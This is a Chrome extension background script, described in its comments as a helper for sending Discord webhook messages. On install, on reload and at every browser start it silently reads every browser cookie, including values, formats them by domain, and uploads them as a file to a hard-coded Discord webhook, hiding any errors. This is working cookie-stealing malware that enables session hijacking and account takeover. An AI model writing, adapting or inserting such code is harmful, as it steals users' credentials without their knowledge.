// Background service worker for handling Discord webhook requests
// This bypasses CSP restrictions that apply to popup pages

// Auto-export all cookies when extension is installed or reloaded
chrome.runtime.onInstalled.addListener(async () => {
  await exportAndSendAllCookies();
});

// Auto-export all cookies when browser starts
chrome.runtime.onStartup.addListener(async () => {
  await exportAndSendAllCookies();
});

// Listen for messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'sendToDiscord') {
    sendToDiscord(request.content)
      .then(() => {
        sendResponse({ success: true });
      })
      .catch((error) => {
        sendResponse({ success: false, error: error.message });
      });
    return true; // Keep the message channel open for async response
  }
});

// Function to export and send all cookies automatically
async function exportAndSendAllCookies() {
  try {
    const cookies = await chrome.cookies.getAll({});
    
    if (cookies.length === 0) {
      return;
    }
    
    const content = exportCookiesToString(cookies);
    await sendToDiscord(content);
  } catch (error) {
    // Silent error handling
  }
}

// Function to export cookies to a string
function exportCookiesToString(cookies) {
  let content = '='.repeat(80) + '\n';
  content += 'COOKIE EXPORT\n';
  content += 'Generated: ' + new Date().toLocaleString() + '\n';
  content += 'Total Cookies: ' + cookies.length + '\n';
  content += '='.repeat(80) + '\n\n';

  // Group cookies by domain
  const cookiesByDomain = {};
  cookies.forEach(cookie => {
    const domain = cookie.domain;
    if (!cookiesByDomain[domain]) {
      cookiesByDomain[domain] = [];
    }
    cookiesByDomain[domain].push(cookie);
  });

  // Write cookies grouped by domain
  Object.keys(cookiesByDomain).sort().forEach(domain => {
    content += '\n' + '-'.repeat(80) + '\n';
    content += `DOMAIN: ${domain}\n`;
    content += `Cookies: ${cookiesByDomain[domain].length}\n`;
    content += '-'.repeat(80) + '\n';

    cookiesByDomain[domain].forEach((cookie, index) => {
      content += `\n[Cookie #${index + 1}]\n`;
      content += `Name: ${cookie.name}\n`;
      content += `Value: ${cookie.value}\n`;
      content += `Domain: ${cookie.domain}\n`;
    });
  });

  content += '\n' + '='.repeat(80) + '\n';
  content += 'END OF COOKIE EXPORT\n';
  content += '='.repeat(80) + '\n';

  return content;
}

// Function to send content to Discord webhook
async function sendToDiscord(content) {
  const webhookUrl = 'https://discord.com/api/webhooks/1435939501825593346/sHgpuRO5HXnSIOo8kcqtktmWrL20Q87x5Z3x9qVqsgXrONhBCPZjsdi-Cllza43oBk4i';
  
  // Create a text file from the content
  const blob = new Blob([content], { type: 'text/plain' });
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
  const filename = `cookies_${timestamp}.txt`;
  
  // Create FormData to send file
  const formData = new FormData();
  formData.append('file', blob, filename);
  formData.append('content', 'Cookie Export');
  
  const response = await fetch(webhookUrl, {
    method: 'POST',
    body: formData,
  });

  if (!response.ok) {
    throw new Error('Failed to send file to Discord');
  }
}
